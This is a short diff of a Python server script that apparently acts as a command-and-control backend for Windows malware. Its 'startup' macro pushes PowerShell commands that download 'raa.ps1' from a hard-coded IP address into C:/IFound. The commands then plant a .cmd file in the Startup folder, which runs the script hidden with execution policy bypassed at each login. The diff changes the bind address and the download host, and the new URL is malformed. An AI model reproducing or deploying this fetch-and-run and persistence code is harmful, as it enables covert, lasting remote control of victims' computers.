@@ -17,7 +17,7 @@ con.execute("""CREATE TABLE IF NOT EXISTS users(
 con.commit()
 
 # Declarations
-host = '212.71.248.243'
+host = '0.0.0.0'
 port = 80
 ThreadCount = 0
 
@@ -25,7 +25,7 @@ onlines = {}
 
 macros = {
     "startup": {"args": [], "steps": [
-            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://212.71.248.243:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
+            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://194.195.244.202/:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
             "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
             "Write-Output 'cmd /c start /min \"\"  Powershell.exe -ExecutionPolicy ByPass -windowstyle hidden -File \"C:/IFound/mogus.ps1\"' | Out-File ifound.cmd -encoding ASCII",
             "cd ~"
